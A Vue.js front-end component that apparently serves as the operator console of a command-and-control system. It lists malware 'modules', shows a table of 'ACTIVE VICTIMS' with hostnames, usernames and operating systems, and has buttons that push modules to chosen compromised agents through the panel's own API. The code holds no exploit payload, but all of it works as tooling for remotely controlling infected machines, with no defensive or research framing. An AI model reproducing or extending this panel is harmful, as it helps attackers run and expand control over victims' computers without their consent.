<template>
  <div>
    <div class="page-header">
      <h1>Modules</h1>
      <span class="badge" v-if="modules.length">{{ modules.length }} available</span>
    </div>

    <!-- Modules Grid -->
    <div class="modules-grid">
      <div v-for="m in modules" :key="m.name" class="module-card" :class="{ pushed: pushedModules[m.name] }">
        <div class="module-header">
          <span class="module-name">{{ m.name }}</span>
          <span class="module-version">v{{ m.version }}</span>
        </div>
        <div class="module-platform">{{ m.platform }}</div>
        <p class="module-desc">{{ m.description }}</p>
        
        <div class="module-commands">
          <span v-for="cmd in m.commands" :key="cmd" class="cmd-tag">{{ cmd }}</span>
        </div>

        <div class="module-actions">
          <select v-model="targetAgent[m.name]" class="agent-select">
            <option value="">Select victim...</option>
            <option v-for="s in sessions" :key="s.ID" :value="s.ID">{{ s.Hostname }} ({{ s.Username }})</option>
          </select>
          <button @click="pushModule(m.name)" class="push-btn" :disabled="!targetAgent[m.name] || loading[m.name]">
            {{ loading[m.name] ? '...' : pushedModules[m.name] ? 'Push Again' : 'Push' }}
          </button>
        </div>

        <div v-if="pushResult[m.name]" class="push-result" :class="{ error: pushResult[m.name].error }">
          {{ pushResult[m.name].msg }}
        </div>
      </div>
    </div>

    <!-- Sessions quick view -->
    <div class="table-wrap" style="margin-top:24px">
      <div class="panel-header">
        <h2>ACTIVE VICTIMS</h2>
        <span class="text-xs text-gray-500">{{ sessions.length }} online</span>
      </div>
      <table class="table">
        <thead>
          <tr><th>Hostname</th><th>User</th><th>OS</th><th>Status</th><th style="width:200px">Quick Push</th></tr>
        </thead>
        <tbody>
          <tr v-for="s in sessions" :key="s.ID">
            <td class="mono fw6">{{ s.Hostname }}</td>
            <td>{{ s.Username }}</td>
            <td><span class="os-tag" :class="osClass(s.OS)">{{ s.OS }}</span></td>
            <td><span class="dot" :class="s.State==='active'?'green':'gray'"></span></td>
            <td>
              <select @change="pushToAgent(s.ID, $event.target.value)" class="quick-push">
                <option value="">Push module...</option>
                <option v-for="m in modules" :key="m.name" :value="m.name">{{ m.name }}</option>
              </select>
            </td>
          </tr>
        </tbody>
      </table>
    </div>
  </div>
</template>

<script>
export default {
  data() {
    return {
      modules: [], sessions: [], targetAgent: {}, loading: {}, pushResult: {},
      pushedModules: {}, timer: null
    }
  },
  mounted() {
    this.fetchAll()
    this.timer = setInterval(() => this.fetchSessions(), 5000)
  },
  beforeUnmount() { clearInterval(this.timer) },
  methods: {
    auth() { const t = sessionStorage.getItem('bty_token'); return t ? { Authorization: 'Bearer ' + t } : {} },
    async fetchAll() {
      await Promise.all([this.fetchModules(), this.fetchSessions()])
    },
    async fetchModules() {
      try {
        const r = await fetch('/api/modules', { headers: this.auth() })
        if (r.status === 401) { this.$router.push('/login'); return }
        this.modules = await r.json() || []
      } catch (e) { console.error('Failed to fetch modules:', e) }
    },
    async fetchSessions() {
      try {
        const r = await fetch('/api/sessions', { headers: this.auth() })
        if (r.status === 401) { this.$router.push('/login'); return }
        this.sessions = await r.json() || []
      } catch (e) { console.error('Failed to fetch sessions:', e) }
    },
    async pushModule(name) {
      const agentId = this.targetAgent[name]
      if (!agentId) return

      this.loading[name] = true
      this.pushResult[name] = null

      try {
        const r = await fetch('/api/modules/push', {
          method: 'POST',
          headers: { ...this.auth(), 'Content-Type': 'application/json' },
          body: JSON.stringify({ module: name, agent_id: agentId })
        })
        const d = await r.json()
        if (d.status === 'pushed') {
          this.pushedModules[name] = true
          this.pushResult[name] = { msg: `✓ Pushed to agent — commands: ${name}_start, ${name}_stop...` }
        } else {
          this.pushResult[name] = { msg: '✗ ' + (d.error || 'Failed'), error: true }
        }
      } catch (e) {
        this.pushResult[name] = { msg: '✗ ' + e.message, error: true }
      }
      this.loading[name] = false
    },
    async pushToAgent(agentId, moduleName) {
      if (!moduleName) return
      this.targetAgent[moduleName] = agentId
      await this.pushModule(moduleName)
    },
    osClass(os) {
      const m = { linux: 'os-linux', windows: 'os-win', darwin: 'os-mac' }
      return m[os] || ''
    }
  }
}
</script>

<style scoped>
.page-header{display:flex;align-items:center;gap:12px;margin-bottom:24px}
.page-header h1{font-size:22px;font-weight:700;color:#111827}
.badge{font-size:12px;background:#ecfdf5;color:#059669;padding:3px 10px;border-radius:20px;font-weight:500;font-family:'JetBrains Mono',monospace}
.modules-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:16px}
.module-card{background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:18px;transition:all .2s}
.module-card:hover{border-color:#05966950;box-shadow:0 2px 8px rgba(0,0,0,.04)}
.module-card.pushed{border-left:3px solid #059669}
.module-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:4px}
.module-name{font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:#111827}
.module-version{font-size:11px;color:#9ca3af;font-family:'JetBrains Mono',monospace}
.module-platform{font-size:11px;color:#059669;text-transform:uppercase;font-weight:500;margin-bottom:8px}
.module-desc{font-size:12px;color:#6b7280;margin-bottom:12px;line-height:1.5}
.module-commands{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:14px}
.cmd-tag{font-size:10px;background:#f0fdf4;color:#047857;padding:2px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace}
.module-actions{display:flex;gap:8px}
.agent-select{flex:1;font-size:12px;border:1px solid #e5e7eb;border-radius:6px;padding:6px 8px;outline:none;font-family:'JetBrains Mono',monospace;background:#fff}
.push-btn{padding:6px 16px;background:#059669;color:#fff;border:none;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer;white-space:nowrap}
.push-btn:hover{background:#047857}
.push-btn:disabled{opacity:.5;cursor:default}
.push-result{margin-top:8px;font-size:11px;font-family:'JetBrains Mono',monospace;color:#059669;background:#f0fdf4;padding:6px 10px;border-radius:6px}
.push-result.error{color:#dc2626;background:#fef2f2}

.table-wrap{background:#fff;border:1px solid #e5e7eb;border-radius:10px;overflow:hidden}
.panel-header{display:flex;align-items:center;justify-content:space-between;padding:12px 14px;border-bottom:1px solid #e5e7eb;background:#fafbfc}
.panel-header h2{font-size:11px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.05em}
.table{width:100%;border-collapse:collapse;font-size:13px}
.table th{text-align:left;padding:10px 14px;font-size:11px;font-weight:600;color:#9ca3af;text-transform:uppercase;letter-spacing:.05em;border-bottom:1px solid #e5e7eb}
.table td{padding:10px 14px;border-bottom:1px solid #f3f4f6;color:#374151}
.mono{font-family:'JetBrains Mono',monospace}
.fw6{font-weight:600}
.dot{display:inline-block;width:6px;height:6px;border-radius:50%;margin-right:6px}
.dot.green{background:#10b981}
.dot.gray{background:#d1d5db}
.os-tag{font-size:11px;padding:1px 6px;border-radius:4px;font-weight:500}
.os-linux{background:#fef3c7;color:#92400e}
.os-win{background:#dbeafe;color:#1e40af}
.os-mac{background:#f3f4f6;color:#374151}
.quick-push{font-size:11px;border:1px solid #e5e7eb;border-radius:4px;padding:3px 6px;outline:none;font-family:'JetBrains Mono',monospace;background:#fff;width:100%}
</style>
